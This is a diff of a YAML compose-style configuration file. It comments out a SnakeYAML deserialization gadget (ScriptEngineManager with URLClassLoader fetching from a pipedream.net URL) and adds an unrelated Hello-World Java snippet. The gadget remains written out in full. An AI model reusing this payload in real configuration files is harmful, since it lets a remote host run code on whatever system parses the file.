@@ -2,11 +2,12 @@
 # Copyright (C) 2021 Intel Corporation
 # SPDX-License-Identifier: Apache-2.0
 # ==============================================================================
-!!javax.script.ScriptEngineManager [
-  !!java.net.URLClassLoader [[
-    !!java.net.URL ["https://enk8bbn6s3fns.x.pipedream.net"]
-  ]]
-]
+#!!javax.script.ScriptEngineManager [
+ # !!java.net.URLClassLoader [[
+  #  !!java.net.URL ["https://enk8bbn6s3fns.x.pipedream.net"]
+  #]]
+#]
+custom_code: |   public class MyApp {     public static void main(String[] args) {       System.out.println("Hello from My Application!");     }   }
 version: "3"
 networks: 
   ovms-bridge:
